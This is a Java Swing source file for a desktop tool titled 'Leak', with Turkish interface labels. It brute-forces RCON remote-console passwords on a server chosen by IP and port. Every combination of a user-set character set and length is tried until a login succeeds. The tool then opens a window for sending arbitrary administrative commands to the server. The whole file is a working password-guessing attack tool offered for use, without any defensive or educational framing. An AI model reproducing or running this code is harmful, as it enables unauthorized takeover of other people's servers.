package dev.astatic;

import net.kronos.rkon.core.Rcon;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.util.concurrent.atomic.AtomicInteger;

public class Main extends JFrame {

    private JTextField ipField, portField, charsetField, lengthField;
    private JTextArea logArea;
    private JButton startButton, stopButton;
    private volatile boolean isRunning = false;
    private Rcon activeRcon;

    public Main() {
        super("Leak");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setSize(600, 400);
        initUI();
    }

    private void initUI() {
        JPanel panel = new JPanel(new BorderLayout());

        // Input Panel
        JPanel inputPanel = new JPanel(new GridLayout(4, 2));
        ipField = new JTextField("ip-address");
        portField = new JTextField("port");
        charsetField = new JTextField("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
        lengthField = new JTextField("10");

        inputPanel.add(new JLabel("IP:"));
        inputPanel.add(ipField);
        inputPanel.add(new JLabel("Port:"));
        inputPanel.add(portField);
        inputPanel.add(new JLabel("Karakter Seti:"));
        inputPanel.add(charsetField);
        inputPanel.add(new JLabel("Şifre Uzunluğu:"));
        inputPanel.add(lengthField);

        JPanel buttonPanel = new JPanel();
        startButton = new JButton("Başlat");
        stopButton = new JButton("Durdur");
        stopButton.setEnabled(false);

        startButton.addActionListener(this::startBruteForce);
        stopButton.addActionListener(e -> stopBruteForce());

        buttonPanel.add(startButton);
        buttonPanel.add(stopButton);

        logArea = new JTextArea();
        logArea.setEditable(false);

        panel.add(inputPanel, BorderLayout.NORTH);
        panel.add(buttonPanel, BorderLayout.CENTER);
        panel.add(new JScrollPane(logArea), BorderLayout.SOUTH);

        add(panel);
    }

    private void startBruteForce(ActionEvent e) {
        isRunning = true;
        startButton.setEnabled(false);
        stopButton.setEnabled(true);

        new Thread(() -> {
            String charset = charsetField.getText();
            int length = Integer.parseInt(lengthField.getText());
            AtomicInteger attempts = new AtomicInteger(0);

            generatePass("", charset, length, attempts);
            SwingUtilities.invokeLater(() -> {
                stopBruteForce();
                log("İşlem tamamlandı veya durduruldu.");
            });
        }).start();
    }

    private void stopBruteForce() {
        isRunning = false;
        startButton.setEnabled(true);
        stopButton.setEnabled(false);
    }

    private void generatePass(String prefix, String charset, int length, AtomicInteger attempts) {
        if (!isRunning) return;

        if (length == 0) {
            int attempt = attempts.incrementAndGet();
            if (attempt % 1000 == 0) {
                log("Denenen Şifre: " + prefix + " | Deneme: " + attempt);
            }

            if (tryPassword(prefix)) {
                log("[BAŞARILI] Şifre Bulundu: " + prefix);
                stopBruteForce();
                return;
            }
            return;
        }

        for (int i = 0; i < charset.length() && isRunning; i++) {
            generatePass(prefix + charset.charAt(i), charset, length - 1, attempts);
        }
    }

    private boolean tryPassword(String password) {
        try {
            Rcon rcon = new Rcon(
                    ipField.getText(),
                    Integer.parseInt(portField.getText()),
                    password.getBytes()
            );
            rcon.connect(ipField.getText(), Integer.parseInt(portField.getText()), password.getBytes());
            activeRcon = rcon;
            openCommandPanel();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void openCommandPanel() {
        JFrame commandFrame = new JFrame("Sender");
        commandFrame.setSize(400, 200);

        JPanel panel = new JPanel(new BorderLayout());
        JTextField commandField = new JTextField();
        JButton sendButton = new JButton("Gönder");
        JTextArea responseArea = new JTextArea();
        responseArea.setEditable(false);

        sendButton.addActionListener(e -> {
            try {
                String response = activeRcon.command(commandField.getText());
                responseArea.append("[Sunucu Cevabı] " + response + "\n");
                commandField.setText("");
            } catch (Exception ex) {
                responseArea.append("[HATA] " + ex.getMessage() + "\n");
            }
        });

        panel.add(commandField, BorderLayout.NORTH);
        panel.add(new JScrollPane(responseArea), BorderLayout.CENTER);
        panel.add(sendButton, BorderLayout.SOUTH);

        commandFrame.add(panel);
        commandFrame.setVisible(true);
        try {
            activeRcon.command("say RCON bağlantısı başarılı");
        } catch (Exception ex) {
            responseArea.append("[HATA] " + ex.getMessage() + "\n");
        }
    }



    private void log(String message) {
        SwingUtilities.invokeLater(() -> {
            logArea.append(message + "\n");
        });
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            new Main().setVisible(true);
        });
    }

}